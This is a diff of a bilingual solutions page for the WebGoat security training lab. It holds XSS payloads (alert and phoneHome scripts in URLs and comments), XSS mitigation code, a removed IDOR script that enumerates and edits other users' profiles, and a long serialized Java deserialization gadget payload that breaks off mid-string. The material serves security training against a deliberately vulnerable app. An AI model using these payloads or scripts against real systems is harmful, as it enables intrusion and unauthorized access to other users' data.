-		2. Les principaux navigateurs ont banni le Javascript de la barre d'URL, contrairement à ce que laisse penser la consigne. Ouvir plurtôt les <i>Outils de développements</i>, et l'onglet <i>Console</i>. La réponse attendue est <code>Yes</code>.
-		</span>
+            2. Les principaux navigateurs ont banni le Javascript de la barre d'URL, contrairement à ce que laisse penser la consigne. Ouvir plurtôt les <i>Outils de développements</i>, et l'onglet <i>Console</i>. La réponse attendue est <code>Yes</code>.
+        </span>
         <span class="multilang" lang="en">
-		2. The main browsers have banned Javascript from the URL bar, contrary to the suggestion. Open the <i>Development Tools</i>, and the <i>Console</i> tab. The expected answer is <code>Yes</code>.
-		</span>
-		<div><br></div>
+            2. The main browsers have banned Javascript from the URL bar, contrary to the suggestion. Open the <i>Development Tools</i>, and the <i>Console</i> tab. The expected answer is <code>Yes</code>.
+        </span>
+        <div><br></div>
         <span class="multilang" lang="fr">
-		7. Entrer <code>&lt;script&gt;alert()&lt;/script&gt;</code> dans la case <b>Enter your credit card number:</b>.
-		</span>
+            7. Entrer <code>&lt;script&gt;alert()&lt;/script&gt;</code> dans la case <b>Enter your credit card number:</b>.
+        </span>
         <span class="multilang" lang="en">
-		7. Put <code>&lt;script&gt;alert()&lt;/script&gt;</code> in the box <b>Enter your credit card number:</b>.
-		</span>
-		<div><br></div>
+            7. Put <code>&lt;script&gt;alert()&lt;/script&gt;</code> in the box <b>Enter your credit card number:</b>.
+        </span>
+        <div><br></div>
         <span class="multilang" lang="fr">
-		10. Ouvrir les <i>Outils de développement</i> et afficher l'ensemble des fichiers Javascript chargés. 
-		<br>
-		Repérer le fichier <code>goatApp/View/GoatRouter.js</code> et l'ouvrir. 
-		<br>
-		Remarquer alors une route de type <code>test/:param</code>. 
-		<br>
-		La réponse attendue est alors <code>start.mvc#test/</code>.
-		</span>
+            10. Ouvrir les <i>Outils de développement</i> et afficher l'ensemble des fichiers Javascript chargés.
+            <br>
+            Repérer le fichier <code>goatApp/View/GoatRouter.js</code> et l'ouvrir.
+            <br>
+            Remarquer alors une route de type <code>test/:param</code>.
+            <br>
+            La réponse attendue est alors <code>start.mvc#test/</code>.
+        </span>
         <span class="multilang" lang="en">
-		10. Open the <i>Development Tools</i> and display all the loaded Javascript files.
-		<br>
-		Locate the <code>goatApp/View/GoatRouter.js</code> file and open it.
-		<br>
-		Note then a <code>test/:param</code> route.
-		<br>
-		The expected answer is then <code>start.mvc#test/</code>.
-		</span>
-		<div><br></div>
+            10. Open the <i>Development Tools</i> and display all the loaded Javascript files.
+            <br>
+            Locate the <code>goatApp/View/GoatRouter.js</code> file and open it.
+            <br>
+            Note then a <code>test/:param</code> route.
+            <br>
+            The expected answer is then <code>start.mvc#test/</code>.
+        </span>
+        <div><br></div>
         <span class="multilang" lang="fr">
-		11. Naviguer vers l'URL 
-		<a href="http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;">http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;</a>
-		<br>
-		Récupérer la réponse.
-		</span>
+            11. Naviguer vers l'URL
+            <a href="http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;">http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;</a>
+            <br>
+            Récupérer la réponse.
+        </span>
         <span class="multilang" lang="en">
-		11. Navigate to the URL
-		<a href="http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;">http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;</a>
-		<br>
-		Retrieve the answer.
-		</span>
-		<div><br></div>
-		12.
-		<div><br></div>
-		<b>1. Are trusted websites immune to XSS attacks?</b>
-		<div><br></div>
-		Solution 4: No because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.
-		<div><br></div>
-		<b>2. When do XSS attacks occur?</b>
-		<div><br></div>
-		Solution 3: The data is included in dynamic content that is sent to a web user without being validated for malicious content.
-		<div><br></div>
-		<b>3. What are Stored XSS attacks?</b>
-		<div><br></div>
-		Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.
-		<div><br></div>
-		<b>4. What are Reflected XSS attacks?</b>
-		<div><br></div>
-		Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request.
-		<div><br></div>
-		<b>5. Is JavaScript the only way to perform XSS attacks?</b>
-		<div><br></div>
-		Solution 4: No there are many other ways. Like HTML, Flash or any other type of code that the browser executes.
-		<div><br></div>
+            11. Navigate to the URL
+            <a href="http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;">http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;</a>
+            <br>
+            Retrieve the answer.
+        </span>
+        <div><br></div>
+        12.
+        <div><br></div>
+        <b>1. Are trusted websites immune to XSS attacks?</b>
+        <div><br></div>
+        Solution 4: No because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.
+        <div><br></div>
+        <b>2. When do XSS attacks occur?</b>
+        <div><br></div>
+        Solution 3: The data is included in dynamic content that is sent to a web user without being validated for malicious content.
+        <div><br></div>
+        <b>3. What are Stored XSS attacks?</b>
+        <div><br></div>
+        Solution 1: The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.
+        <div><br></div>
+        <b>4. What are Reflected XSS attacks?</b>
+        <div><br></div>
+        Solution 2: They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request.
+        <div><br></div>
+        <b>5. Is JavaScript the only way to perform XSS attacks?</b>
+        <div><br></div>
+        Solution 4: No there are many other ways. Like HTML, Flash or any other type of code that the browser executes.
+        <div><br></div>
     </div>
     <div>
         <div><br></div>
         <h5>Cross Site Scripting (stored)</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-			3. Poster <code>phoneHome Response is &lt;script&gt;webgoat.customjs.phoneHome()&lt;/script&gt;</code> en commentaire.
-			<br>
-			Récupérer le code en réponse.
-		</span>
+            3. Poster <code>phoneHome Response is &lt;script&gt;webgoat.customjs.phoneHome()&lt;/script&gt;</code> en commentaire.
+            <br>
+            Récupérer le code en réponse.
+        </span>
         <span class="multilang" lang="en">
-			3. Comment with <code>phoneHome Response is &lt;script&gt;webgoat.customjs.phoneHome()&lt;/script&gt;</code>.
-			<br>
-			Retrieve the code in response.
-		</span>
+            3. Comment with <code>phoneHome Response is &lt;script&gt;webgoat.customjs.phoneHome()&lt;/script&gt;</code>.
+            <br>
+            Retrieve the code in response.
+        </span>
     </div>
     <div>
         <div><br></div>
         <h5>Cross Site Scripting (mitigation)</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-			5. La première ligne doit contenir : <code>&lt;%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %&gt;</code>
-			<br>
-			Remplacer <code>&lt;%= request.getParameter("first_name")%&gt;</code> par <code>${e:forHtml(param.first_name)}</code>.
-			<br>
-			Remplacer <code>&lt;%= request.getParameter("last_name")%&gt;</code> par <code>${e:forHtml(param.last_name)}</code>.
-		</span>
+            5. La première ligne doit contenir : <code>&lt;%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %&gt;</code>
+            <br>
+            Remplacer <code>&lt;%= request.getParameter("first_name")%&gt;</code> par <code>${e:forHtml(param.first_name)}</code>.
+            <br>
+            Remplacer <code>&lt;%= request.getParameter("last_name")%&gt;</code> par <code>${e:forHtml(param.last_name)}</code>.
+        </span>
         <span class="multilang" lang="en">
-		5. Thie first line shoud contain: <code>&lt;%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %&gt;</code>
-		<br>
-		Replace <code>&lt;%= request.getParameter("first_name")%&gt;</code> with <code>${e:forHtml(param.first_name)}</code>.
-		<br>
-		Replace <code>&lt;%= request.getParameter("last_name")%&gt;</code> with <code>${e:forHtml(param.last_name)}</code>.
-		</span>
-		<div><br></div>
-		6. 
-		<br>
-		<code>
-		import org.owasp.validator.html.*;
+            5. Thie first line shoud contain: <code>&lt;%@ taglib uri="https://www.owasp.org/index.php/OWASP_Java_Encoder_Project" %&gt;</code>
+            <br>
+            Replace <code>&lt;%= request.getParameter("first_name")%&gt;</code> with <code>${e:forHtml(param.first_name)}</code>.
+            <br>
+            Replace <code>&lt;%= request.getParameter("last_name")%&gt;</code> with <code>${e:forHtml(param.last_name)}</code>.
+        </span>
+        <div><br></div>
+        6.
         <br>
-		import MyCommentDAO;
-        <br>
-        <br>
-		public class AntiSamyController {
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp; public void saveNewComment(int threadID, int userID, String newComment){
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Policy p = Policy.getInstance("antisamy-slashdot.xml");
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AntiSamy as = new AntiSamy();
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CleanResults cr = as.scan(newComment, p, AntiSamy.DOM);
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyCommentDAO.addComment(threadID, userID, cr.getCleanHTML());
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp; }
-        <br>
-		}
-        <br>
-		</code>
+        <code>
+            import org.owasp.validator.html.*;
+            <br>
+            import MyCommentDAO;
+            <br>
+            <br>
+            public class AntiSamyController {
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; public void saveNewComment(int threadID, int userID, String newComment){
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Policy p = Policy.getInstance("antisamy-slashdot.xml");
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; AntiSamy as = new AntiSamy();
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CleanResults cr = as.scan(newComment, p, AntiSamy.DOM);
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MyCommentDAO.addComment(threadID, userID, cr.getCleanHTML());
+            <br>
+            &nbsp;&nbsp;&nbsp;&nbsp; }
+            <br>
+            }
+            <br>
+        </code>
     </div>
 </div>
+
 <div><br></div>
 <div><br></div>
+
 <div>
-    <h4><u><b>Access Control Flaws:</b></u></h4>
+    <h4><u><b>(A8) Insecure Deserialization:</b></u></h4>
     <div>
         <div><br></div>
-        <h5>Insecure Direct Object References</h5>
+        <h5>Insecure Deserialization</h5>
         <div><br></div>
         <span class="multilang" lang="fr">
-		2. S'indentifier avec les identifiants fournis.
-		</span>
+            5. Je n'ai pas réussi à valider la leçon, les pistes que j'ai pu trouver sont les suivantes:
+            <br>
+            Le package à utiliser pour déclencher la faille serait Hibernate 5.
+            <br>
+            Le payload suivant, trouvé dans un <a href="https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java">module</a> de Burp Suite fonctionne, mais déclenche un Sleep de 10 secondes:
+            <br>
+            <code>
+                rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMACUkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAGV9hY2Nlc3NFeHRlcm5hbFN0eWxlc2hlZXRxAH4AIEwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AIEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwcQB-ACd0ABNnZXRPdXRwdXRQcm9wZXJ0aWVzdAAEdGVzdHBwcHBwcHBwcHB1cgAaW0xvcmcuaGliZXJuYXRlLnR5cGUuVHlwZTt-r6uh5JVhmgIAAHhwAAAAAXEAfgAScHBzcQB-ACIAAAAA_____wB0AANhbGxwdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABiXK_rq-AAAAMQAyBwAwAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkBwAEAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcABgEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk_OR3e8-AQAGPGluaXQ-AQADKClWAQAEQ29kZQoAAwAQDAAMAA0BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAZAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABBqYXZhL2xhbmcvVGhyZWFkBwAqAQAFc2xlZXABAAQoSilWDAAsAC0KACsALgEAH3lzb3NlcmlhbC9Qd25lcjIzNzU0MjU1MzE4ODA2MDABACFMeXNvc2VyaWFsL1B3bmVyMjM3NTQyNTUzMTg4MDYwMDsAIQABAAMAAQAFAAEAGgAHAAgAAQAJAAAAAgAKAAQAAQAMAA0AAQAOAAAALwABAAEAAAAFKrcAD7EAAAACABEAAAAGAAEAAAAuABIAAAAMAAEAAAAFABMAMQAAAAEAFQAWAAIAFwAAAAQAAQAYAA4AAAA_AAAAAwAAAAGxAAAAAgARAAAABgABAAAAMwASAAAAIAADAAAAAQATADEAAAAAAAEAGgAbAAEAAAABABwAHQACAAEAFQAeAAIAFwAAAAQAAQAYAA4AAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAANwASAAAAKgAEAAAAAQATADEAAAAAAAEAGgAbAAEAAAABAB8AIAACAAAAAQAhACIAAwAIACkADQABAA4AAAAZAAMAAgAAAA2nAAMBTBEnEIW4AC-xAAAAAAACACMAAAACACQAJQAAAAoAAQABACYAKAAJdXEAfgAwAAAB1Mr-ur4AAAAxABsHAAIBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwcABAEAEGphdmEvbGFuZy9PYmplY3QHAAYBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUKAAMAEAwADAANAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAEAAwABAAUAAQAaAAcACAABAAkAAAACAAoAAQABAAwADQABAA4AAAAvAAEAAQAAAAUqtwAPsQAAAAIAEQAAAAYAAQAAADsAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEAAQAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACxxAH4ANHg
+            </code>
+            <br>
+            La <a href="https://github.com/frohoff/ysoserial">bibliothèque ysoserial</a> semble être une piste de recherche aussi.
+        </span>
         <span class="multilang" lang="en">
-		2. Identify with the provided credentials.
-		</span>
-		<div><br></div>
-		3. role, userID
-		<div><br></div>
-		4. WebGoat/IDOR/profile/2342384
-		<div><br></div>
-		5. <b>View Another Profile</b>:
-		<br>
-		<code>
-		import requests
-        <br>
-        <br>
-		def idor_5():  
-        <br>  
-		&nbsp;&nbsp;&nbsp;&nbsp; index = 2342300
-        <br>
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp; headers = {
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Cookie': COOKIE,
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp; }
-        <br>
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp; while True:
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; r = requests.get('http://192.168.99.100:8080/WebGoat/IDOR/profile/{}'.format(index), headers=headers)
-        <br>
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if r.status_code != 500 and index != 2342384:
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; print("Index: {}".format(index))
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return
-        <br>
-		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index += 1
-        <br>
-        <br>
-		idor_5()
-		</code>
-		<div><br></div>
-		<b>Edit Another Profile</b>:
-		<br>
-        <span class="multilang" lang="fr">
-			Envoyer une requête PUT vers http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 avec pour en-tête <code>Content-Type: application/json</code> 
-			et pour corps <code>{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}</code>
-		</span>
-        <span class="multilang" lang="en">
-			Send a PUT request to http://192.168.99.100:8080/WebGoat/IDOR/profile/2342388 with header <code>Content-Type: application/json</code> 
-			and body <code>{"role":1, "color":"red", "size":"large", "name":"Buffalo Bill", "userId":2342388}</code>
-		</span>
-	</div>
-	<div>
-        <div><br></div>
-        <h5>Missing Function Level Access Control</h5>
-        <div><br></div>
-        <span class="multilang" lang="fr">
-			2. Examiner l'élément <b>Log Out</b>. 
-			Juste en dessous dans le HTML, on trouve des champs cachés, dont les champs : Users, Config.
-		</span>
-        <span class="multilang" lang="en">
-			2. Examine the <b>Log Out</b> element. 
-			Just below in the HTML, we can see hidden fields: Users, Config.
-		</span>    
-		<div><br></div>
-		<span class="multilang" lang="fr">
-			3. Aller sur  http://192.168.99.100:8080/WebGoat/users and rejouer la requête en ajoutant un en-tête <code>Content-Type: application/json</code>
-		</span>
-		<span class="multilang" lang="en">
-			3. Go to  http://192.168.99.100:8080/WebGoat/users replay the request with header <code>Content-Type: application/json</code>
-		</span>
-	</div>
+            5. I could not validate the lesson, here the hints I have found:
+            <br>
+            The package to use to trigger the flaw seems to be Hibernate 5.
+            <br>
+            The following payload, found in a <a href="https://github.com/federicodotta/Java-Deserialization-Scanner/blob/master/src/burp/BurpExtender.java">Burp Suite module</a> works but triggers a 10 seconds sleep.
+            <br>
+            <code>
+                rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZX